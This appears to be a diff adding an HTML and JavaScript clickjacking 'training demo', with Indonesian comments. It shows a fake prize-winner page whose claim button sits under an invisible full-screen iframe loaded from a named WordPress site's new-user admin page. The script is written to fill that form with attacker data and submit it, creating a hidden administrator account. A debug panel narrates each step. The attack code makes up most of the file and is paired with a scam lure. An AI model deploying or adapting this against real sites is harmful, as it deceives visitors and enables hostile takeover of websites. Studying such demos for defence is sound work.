@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Demo Clickjacking - Training</title>
+    <style>
+        /* === TAMPILAN PALSU UNTUK USER === */
+        body {
+            font-family: Arial;
+            background: #f0f0f0;
+            margin: 0;
+            padding: 20px;
+        }
+        
+        .fake-site {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        
+        .winner-banner {
+            background: linear-gradient(45deg, #FF0000, #FF8800);
+            color: white;
+            padding: 30px;
+            text-align: center;
+            border-radius: 10px;
+            margin-bottom: 30px;
+        }
+        
+        .claim-button {
+            background: #28a745;
+            color: white;
+            padding: 20px 40px;
+            font-size: 24px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            display: block;
+            margin: 30px auto;
+            width: 80%;
+        }
+        
+        /* === IFRAME TERSEMBUNYI === */
+        .hidden-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            border: none;
+            opacity: 0.0; /* BENAR-BENAR TIDAK KELIHATAN */
+            z-index: 9999;
+        }
+        
+        /* === PANEL UNTUK LIHAT APA YANG TERJADI === */
+        .debug-console {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            background: #000;
+            color: #0f0;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            border-radius: 5px;
+            max-width: 500px;
+            z-index: 10000;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ========================================== -->
+    <!-- BAGIAN 1: WEBSITE PALSU (YANG DILIHAT USER) -->
+    <!-- ========================================== -->
+    
+    <div class="fake-site">
+        <div class="winner-banner">
+            <h1>🎉 SELAMAT! ANDA MENANG! 🎉</h1>
+            <p>Anda terpilih sebagai pemenang undian khusus!</p>
+        </div>
+        
+        <h2>📦 HADIAH ANDA:</h2>
+        <ul>
+            <li>💰 Uang Tunai: Rp 5.000.000</li>
+            <li>📱 iPhone 15 Pro Max</li>
+            <li>🎮 PlayStation 5</li>
+        </ul>
+        
+        <p><strong>⏰ Klaim dalam 5 menit atau hadiah hangus!</strong></p>
+        
+        <!-- BUTTON JEBakanAN -->
+        <button class="claim-button" id="claimButton">
+            🎁 KLIK DISINI UNTUK CLAIM HADIAH!
+        </button>
+        
+        <p style="text-align: center; color: #666; font-size: 12px;">
+            Anda akan diarahkan ke halaman verifikasi
+        </p>
+    </div>
+
+    <!-- ========================================== -->
+    <!-- BAGIAN 2: IFRAME TERSEMBUNYI (SERANGAN) -->
+    <!-- ========================================== -->
+    
+    <iframe src="https://rumahtamushofia.my.id/wp-admin/user-new.php" 
+            class="hidden-layer" 
+            id="attackFrame">
+    </iframe>
+
+    <!-- ========================================== -->
+    <!-- BAGIAN 3: KONSOL DEBUG (LIHAT PROSES) -->
+    <!-- ========================================== -->
+    
+    <div class="debug-console" id="debugConsole">
+        🕵️ DEMO CLICKJACKING - DEBUG MODE<br>
+        ================================<br>
+        Status: READY<br>
+        Target: WordPress Admin<br>
+        Action: Create New User<br>
+        <br>
+        Press [V] to show/hide hidden layer<br>
+        Press [D] for detailed debug
+    </div>
+
+    <script>
+        // ==========================================
+        // BAGIAN 4: SCRIPT SERANGAN
+        // ==========================================
+        
+        console.log('🔓 Clickjacking Demo Initialized');
+        
+        // Variabel untuk tracking
+        let attackStep = 0;
+        
+        // Tunggu iframe selesai load
+        document.getElementById('attackFrame').onload = function() {
+            updateDebug('✅ Hidden frame loaded successfully');
+            attackStep = 1;
+        };
+        
+        // FUNGSI UTAMA: Ketika user klik button hadiah
+        document.getElementById('claimButton').addEventListener('click', function() {
+            attackStep++;
+            updateDebug(`🎯 USER MENGKLIK BUTTON! (Step ${attackStep})`);
+            
+            // Dapatkan akses ke iframe yang tersembunyi
+            const iframe = document.getElementById('attackFrame');
+            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+            
+            updateDebug('🔍 Analyzing WordPress admin page...');
+            
+            // Tunggu sebentar untuk memastikan iframe ready
+            setTimeout(function() {
+                try {
+                    // CEK APAKAH KITA DI WORDPRESS ADMIN ATAU LOGIN PAGE
+                    const pageTitle = iframeDoc.title;
+                    updateDebug(`📄 Page Title: "${pageTitle}"`);
+                    
+                    if (pageTitle.includes('Log In') || pageTitle.includes('Login')) {
+                        // KASUS 1: USER BELUM LOGIN
+                        updateDebug('🔐 SAFE: User not logged in to WordPress');
+                        updateDebug('💡 If user was logged in, attack would succeed!');
+                        alert('🔐 SAFE DEMO: Anda belum login ke WordPress admin.\n\nIni membuktikan bahwa jika admin sedang login, serangan akan berhasil!');
+                        
+                    } else if (pageTitle.includes('Add New User') || pageTitle.includes('Users')) {
+                        // KASUS 2: USER SUDAH LOGIN - LANJUTKAN SERANGAN
+                        updateDebug('🚨 DANGER: User is logged in as Admin!');
+                        updateDebug('⚡ Executing attack: Creating new admin user...');
+                        
+                        // ISI FORM WORDPRESS DENGAN DATA HACKER
+                        const usernameField = iframeDoc.querySelector('#user_login');
+                        const emailField = iframeDoc.querySelector('#email');
+                        const passwordField = iframeDoc.querySelector('#pass1');
+                        const roleSelect = iframeDoc.querySelector('#role');
+                        const submitButton = iframeDoc.querySelector('#createuser input[type="submit"]');
+                        
+                        if (usernameField && emailField) {
+                            // Isi form dengan data attacker
+                            usernameField.value = 'hacker_admin_' + Date.now();
+                            emailField.value = 'hacker' + Date.now() + '@example.com';
+                            if (passwordField) passwordField.value = 'Password123!';
+                            if (roleSelect) roleSelect.value = 'administrator';
+                            
+                            updateDebug('✅ Form filled with attacker data');
+                            updateDebug('👤 Username: ' + usernameField.value);
+                            updateDebug('📧 Email: ' + emailField.value);
+                            updateDebug('🎯 Role: Administrator');
+                            
+                            // KIRIM FORM (Buat user baru)
+                            setTimeout(function() {
+                                if (submitButton) {
+                                    submitButton.click();
+                                    updateDebug('🎉 ATTACK SUCCESSFUL!');
+                                    updateDebug('💀 New admin user created in WordPress!');
+                                    alert('🚨 SERANGAN BERHASIL!\n\nUser admin baru telah dibuat di WordPress!\n\nIni membuktikan kerentanan clickjacking sangat berbahaya!');
+                                }
+                            }, 1000);
+                            
+                        } else {
+                            updateDebug('❌ Could not find WordPress form elements');
+                        }
+                    } else {
+                        updateDebug('❓ Unknown page: ' + pageTitle);
+                    }
+                    
+                } catch (error) {
+                    updateDebug('❌ Error: ' + error.message);
+                    updateDebug('🔒 Browser security may be blocking the attack');
+                }
+            }, 500);
+        });
+        
+        // FUNGSI UPDATE DEBUG CONSOLE
+        function updateDebug(message) {
+            const console = document.getElementById('debugConsole');
+            console.innerHTML += '<br>' + message;
+            console.scrollTop = console.scrollHeight;
+            console.log('[DEMO] ' + message);
+        }
+        
+        // KEYBOARD SHORTCUTS UNTUK DEMO
+        document.addEventListener('keydown', function(event) {
+            const iframe = document.getElementById('attackFrame');
+            
+            // [V] - Tampilkan/sembunyikan iframe
+            if (event.key === 'v' || event.key === 'V') {
+                iframe.style.opacity = iframe.style.opacity === '0.5' ? '0.0' : '0.5';
+                updateDebug('👁️ Iframe visibility: ' + (iframe.style.opacity === '0.5' ? 'VISIBLE' : 'HIDDEN'));
+            }
+            
+            // [D] - Detailed debug info
+            if (event.key === 'd' || event.key === 'D') {
+                updateDebug('=== DETAILED DEBUG ===');
+                updateDebug('Iframe URL: ' + iframe.src);
+                updateDebug('Iframe opacity: ' + iframe.style.opacity);
+                updateDebug('Attack step: ' + attackStep);
+            }
+        });
+        
+    </script>
+
+</body>
+</html>
